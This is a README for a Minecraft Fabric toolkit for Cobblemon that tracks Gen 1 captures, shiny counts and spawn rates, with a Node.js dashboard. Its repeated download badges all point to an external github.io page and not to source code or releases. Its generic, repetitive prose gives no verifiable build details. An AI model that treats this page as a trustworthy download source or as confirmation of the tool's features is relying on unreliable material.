# Cobblemon Academy Tools v2.0 - Game Script Utility 2026

> **Cobblemon Academy Tools** is a Minecraft Fabric toolkit paired with a web dashboard for recording Gen 1 Pokemon captures, checking Cobblemon spawn rates, and following shiny-hunting progress on a server.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Minecraft%201.21.1%20Fabric-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/millerseanjzxi7737/cobblemon-academy-script-tools?style=flat-square)](https://github.com/millerseanjzxi7737/cobblemon-academy-script-tools)

---

<p align="center">
  <a href="https://millerseanjzxi7737.github.io/cobblemon-academy-script-tools/">
    <img src="https://img.shields.io/badge/Download-Cobblemon%20Academy%20Tools%20Script-brightgreen?style=for-the-badge" alt="Download Cobblemon Academy Tools Script">
  </a>
</p>

> **[Download Cobblemon Academy Tools](https://millerseanjzxi7737.github.io/cobblemon-academy-script-tools/)**

---

[Download Latest Build](https://millerseanjzxi7737.github.io/cobblemon-academy-script-tools/)

---

## What It Provides

Designed for Cobblemon servers running on Minecraft 1.21.1 with Fabric, Cobblemon Academy Tools maintains a complete capture record for the original 151 Pokemon. It also reports shiny counters, raises shiny alerts, and places spawn-rate details in an in-game HUD.

Tracked information is available beyond the game through an HTTP API and browser dashboard. For deployments that need a separate presentation layer, the project includes a standalone Node.js dashboard mirror. API results and static assets may be cached to help keep the server-facing interface available during a primary server connection outage. Ubuntu VPS setups can be operated with systemd and nginx.

---

## Included Capabilities

- Maintain capture progress for every one of the 151 Gen 1 Pokemon.
- Track shiny counts and notify users about shiny activity.
- Present Cobblemon spawn rates through an in-game HUD.
- Make collected data available to external clients through an HTTP API.
- Provide a browser-accessible dashboard for monitoring.
- Offer a separate Node.js mirror for the dashboard.
- Cache API responses and static resources for offline dashboard availability.
- Deploy on an Ubuntu VPS using systemd and nginx.

---

## Installation and Deployment

1. Visit the [latest build page](https://millerseanjzxi7737.github.io/cobblemon-academy-script-tools/).
2. Choose the package intended for a Minecraft 1.21.1 Fabric installation.
3. Copy the necessary mod files into the appropriate Fabric directory.
4. Launch the client or server, then verify that Cobblemon Academy Tools loads in the expected Cobblemon setup.
5. When the HTTP service is active, visit the configured dashboard address.

The dashboard mirror may be installed separately on another host and configured to consume the tool's HTTP API. For Ubuntu VPS deployments, systemd can manage the services while nginx handles web delivery.

A common rollout sequence looks like this:

- Set up the Minecraft and Fabric components.
- Turn on the API and dashboard service.
- Add and configure the Node.js mirror if a remote or independent dashboard is needed.
- Register and run the service through systemd.
- Use nginx to publish the dashboard in a VPS deployment.

---

## Configuration Areas

| Area | Purpose |
|---|---|
| Capture tracker | Follows collection progress for all 151 Gen 1 Pokemon |
| Shiny monitoring | Reports counters and issues shiny alerts |
| Spawn-rate HUD | Displays Cobblemon spawn-rate data during gameplay |
| HTTP API | Supplies tracked information to dashboard clients |
| Web dashboard | Shows server and capture information in a browser |
| Node.js mirror | Hosts an independent dashboard view |
| Cache | Preserves API and static resources for offline availability |
| VPS services | Enables Ubuntu deployment with systemd and nginx |

The exact directories, service identifiers, and deployment settings vary according to the chosen server and dashboard layout.

---

## Supported Environment

- **Minecraft:** 1.21.1
- **Mod loader:** Fabric
- **Game integration:** Cobblemon
- **Deployment targets:** Minecraft client or server, plus Ubuntu VPS environments
- **Dashboard runtime:** Node.js for the standalone mirror
- **Web delivery:** nginx can be used with systemd-managed Ubuntu deployments

This utility targets the specified Minecraft 1.21.1 Fabric environment. Different Minecraft versions, mod loaders, or Cobblemon releases may need changes and are not necessarily supported. Dashboard operation likewise requires the HTTP API and related services to be running and reachable.

---

## Frequently Asked Questions

### What is the installation process?

Get the latest build, place its mod components in the relevant Fabric installation, and start a Minecraft client or server that has Cobblemon installed.

### How can I open the dashboard?

Run the HTTP API and dashboard service, then browse to the configured address. If a separate endpoint is preferred, deploy the standalone Node.js mirror.

### Are all original Pokedex entries included?

Yes. Capture tracking covers the complete set of 151 Gen 1 Pokemon.

### Is the tracker or HUD configurable?

Capture tracking, shiny monitoring, the spawn-rate HUD, API access, dashboard display, and caching are separated into individual areas. The customization available to you depends on the configuration provided by the selected build and deployment.

### What hosting options are available for the dashboard?

The dashboard may operate beside the Minecraft environment or from an independent Node.js deployment. On an Ubuntu VPS, systemd can manage the services and nginx can provide web delivery.

### Will the dashboard work during a temporary server outage?

Cached API responses and static content help dashboard-related components remain available offline. Current live information still requires access to the API and its source services.

### How should I update an existing installation?

Follow the latest build link above and check the package information before replacing the current files. Keep the Minecraft, Fabric, Cobblemon, and dashboard components consistent with the supported environment.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
